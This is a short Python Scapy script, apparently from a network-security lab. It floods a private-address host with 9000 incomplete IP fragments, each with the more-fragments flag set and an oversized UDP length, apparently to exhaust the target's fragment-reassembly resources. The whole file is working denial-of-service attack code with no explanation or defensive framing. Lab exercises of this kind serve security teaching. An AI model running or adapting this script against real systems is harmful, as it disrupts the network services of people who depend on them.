#!/usr/bin/python3
from scapy.all import *

ID = 1000
dip = "10.0.2.7"

for i in range(9000):
	udp = UDP(sport=7070, dport=9090, chksum=0)
	udp.len = 65535
	ip = IP(dst=dip, id=ID+i, frag=0, flags=1, proto=17)
	payload = 'A'*10
	pkt = ip/udp/payload
	send(pkt)